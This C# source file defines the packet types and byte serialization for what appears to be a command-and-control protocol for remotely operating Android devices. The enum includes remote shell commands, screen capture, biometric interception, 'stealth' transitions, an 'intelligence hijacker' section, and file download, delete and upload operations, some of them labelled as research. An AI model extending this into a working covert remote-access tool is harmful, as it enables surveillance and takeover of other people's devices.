using System;
using System.IO;
using System.Text;

namespace TcpServerApp.Services.Elite.Networking
{
    // Force recompile timestamp
    public enum ElitePacketType : byte
    {
        // System
        Heartbeat = 0x01,
        Handshake = 0x02,
        Disconnect = 0x03,

        // Commands
        ShellCommand = 0x10,
        FileOperation = 0x11,
        ScreenCapture = 0x12,
        DeviceInfo = 0x13,
        
        // Data
        LogMessage = 0x20,
        BinaryResponse = 0x21,
        SensorData = 0x22,
        InstalledApps = 0x28,
        
        // Research
        BiometricIntercept = 0x50,
        FirebaseSignal = 0x51,
        ProfilingAudit = 0x60,
        ThermalState = 0x61,
        SandboxAudit = 0x62,

        // Window Orchestration (Android 16 Elite)
        WindowHierarchyRequest = 0x70,
        WindowHierarchyResponse = 0x71,
        WindowContainerCommand = 0x72,
        TransitionEvent = 0x73,
        PredictiveBackEvent = 0x74,
        ColdStartAudit = 0x75,
        PathAnalytics = 0x76,
        SurfaceSyncCapture = 0x77,
        
        // BAKLAVA SINGULARITY (Sovereign)
        WindowTransactionRequest = 0x80,
        WindowBorderControl = 0x81,
        StealthTransition = 0x82,
        ContentProtectionAudit = 0x83,
        
        // QUANTUM PROFILING & INTELLIGENCE HIJACKER (Android 16 Exclusive)
        QuantumProfilingCommand = 0x90,
        QuantumProfilingResult = 0x91,
        QuantumAICommand = 0x92,
        QuantumAIData = 0x93,
        QuantumPerformanceCommand = 0x94,
        QuantumTraceCommand = 0x95,
        QuantumContentProtectionCommand = 0x96,

        // File Manager (Research FS Audit)
        FileListRequest = 0xB0,
        FileListResponse = 0xB1,
        FileDownloadRequest = 0xB2,
        FileDownloadResponse = 0xB3,
        FileDeleteRequest = 0xB4,
        FileUploadRequest = 0xB5
    }

    public class Packet
    {
        public const byte MAGIC_BYTE = 0xB1;
        public const byte VERSION = 0x01;
        public const int HEADER_SIZE = 7; // Magic(1) + Ver(1) + Type(1) + Len(4)

        public ElitePacketType Type { get; set; }
        public byte[] Payload { get; set; }

        public Packet(ElitePacketType type, byte[] payload)
        {
            Type = type;
            Payload = payload ?? Array.Empty<byte>();
        }

        public Packet(ElitePacketType type, string jsonPayload)
        {
            Type = type;
            Payload = Encoding.UTF8.GetBytes(jsonPayload);
        }

        public byte[] ToBytes()
        {
            using var ms = new MemoryStream();
            using var writer = new BinaryWriter(ms);

            // 1. Header
            writer.Write(MAGIC_BYTE);
            writer.Write(VERSION);
            writer.Write((byte)Type);
            writer.Write(Payload.Length); // Int32 Little Endian (Standard)

            // 2. Body
            if (Payload.Length > 0)
            {
                writer.Write(Payload);
            }

            return ms.ToArray();
        }

        public static Packet FromBytes(byte[] header, byte[] body)
        {
            if (header[0] != MAGIC_BYTE) throw new InvalidDataException("Invalid Protocol Magic");
            if (header[1] != VERSION) throw new InvalidDataException("Unsupported Protocol Version");

            var type = (ElitePacketType)header[2];
            
            return new Packet(type, body);
        }
    }
}
